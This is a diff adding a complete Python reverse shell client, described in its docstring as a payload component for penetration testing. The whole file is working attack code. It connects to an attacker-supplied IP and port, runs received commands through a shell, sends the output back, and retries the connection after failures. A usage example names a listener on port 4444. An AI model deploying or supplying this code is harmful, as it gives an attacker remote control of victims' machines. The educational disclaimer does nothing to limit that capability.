@@ -1,0 +1,186 @@
+#!/usr/bin/env python3
+"""
+Reverse Shell Client - Payload Component
+Connects to attacker's listener and provides interactive shell
+Author: Babatunde2112
+License: Educational Use Only
+
+IMPORTANT: This script is for authorized penetration testing ONLY.
+Unauthorized use is illegal and unethical.
+"""
+
+import socket
+import subprocess
+import sys
+import time
+import os
+import platform
+
+class ReverseShellClient:
+    """Client component that connects to listener and executes commands"""
+    
+    def __init__(self, attacker_ip, attacker_port):
+        """
+        Initialize reverse shell client
+        
+        Args:
+            attacker_ip (str): Attacker's IP address
+            attacker_port (int): Attacker's listening port
+        """
+        self.attacker_ip = attacker_ip
+        self.attacker_port = attacker_port
+        self.socket = None
+        self.is_windows = platform.system() == "Windows"
+    
+    def connect(self):
+        """
+        Establish connection to attacker's listener
+        
+        Returns:
+            bool: True if connection successful, False otherwise
+        """
+        try:
+            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            self.socket.connect((self.attacker_ip, self.attacker_port))
+            return True
+        
+        except Exception as e:
+            print(f"[!] Connection failed: {str(e)}", file=sys.stderr)
+            return False
+    
+    def get_shell_command(self):
+        """
+        Get appropriate shell command based on OS
+        
+        Returns:
+            list: Shell command and arguments
+        """
+        if self.is_windows:
+            return ["cmd.exe"]
+        else:
+            return ["/bin/bash", "-i"]  # Interactive bash
+    
+    def execute_command(self, command):
+        """
+        Execute command and return output
+        
+        Args:
+            command (str): Command to execute
+            
+        Returns:
+            bytes: Command output
+        """
+        try:
+            # Execute command with shell=True for complex commands
+            if self.is_windows:
+                output = subprocess.check_output(
+                    command,
+                    shell=True,
+                    stderr=subprocess.STDOUT,
+                    text=False
+                )
+            else:
+                output = subprocess.check_output(
+                    command,
+                    shell=True,
+                    stderr=subprocess.STDOUT,
+                    text=False
+                )
+            
+            return output
+        
+        except subprocess.CalledProcessError as e:
+            return e.output
+        
+        except Exception as e:
+            return str(e).encode()
+    
+    def run(self):
+        """Main reverse shell loop"""
+        try:
+            while True:
+                try:
+                    # Receive command from attacker
+                    command = self.socket.recv(1024).decode().strip()
+                    
+                    if not command:
+                        continue
+                    
+                    if command.lower() == "exit":
+                        break
+                    
+                    # Execute command
+                    output = self.execute_command(command)
+                    
+                    # Send output back to attacker
+                    self.socket.sendall(output)
+                
+                except socket.timeout:
+                    continue
+                
+                except Exception as e:
+                    error_msg = f"[!] Error: {str(e)}\n".encode()
+                    self.socket.sendall(error_msg)
+                    continue
+        
+        except KeyboardInterrupt:
+            pass
+        
+        except Exception as e:
+            pass
+        
+        finally:
+            self.close()
+    
+    def close(self):
+        """Close socket connection"""
+        if self.socket:
+            try:
+                self.socket.close()
+            except:
+                pass
+    
+    def run_with_retry(self, max_attempts=5, retry_delay=5):
+        """
+        Run with automatic reconnection on failure
+        
+        Args:
+            max_attempts (int): Maximum connection attempts
+            retry_delay (int): Delay between retries in seconds
+        """
+        attempt = 0
+        
+        while attempt < max_attempts:
+            if self.connect():
+                print(f"[+] Connected to {self.attacker_ip}:{self.attacker_port}")
+                self.run()
+            
+            attempt += 1
+            
+            if attempt < max_attempts:
+                time.sleep(retry_delay)
+
+
+def main():
+    if len(sys.argv) < 3:
+        print("Usage: python3 client.py <ATTACKER_IP> <ATTACKER_PORT>")
+        print("Example: python3 client.py 192.168.1.4 4444")
+        sys.exit(1)
+    
+    attacker_ip = sys.argv[1]
+    
+    try:
+        attacker_port = int(sys.argv[2])
+    except ValueError:
+        print("[-] Port must be a valid integer")
+        sys.exit(1)
+    
+    # Suppress output for stealthiness
+    client = ReverseShellClient(attacker_ip, attacker_port)
+    
+    # Try to connect with retry logic
+    client.run_with_retry()
+
+
+if __name__ == "__main__":
+    main()
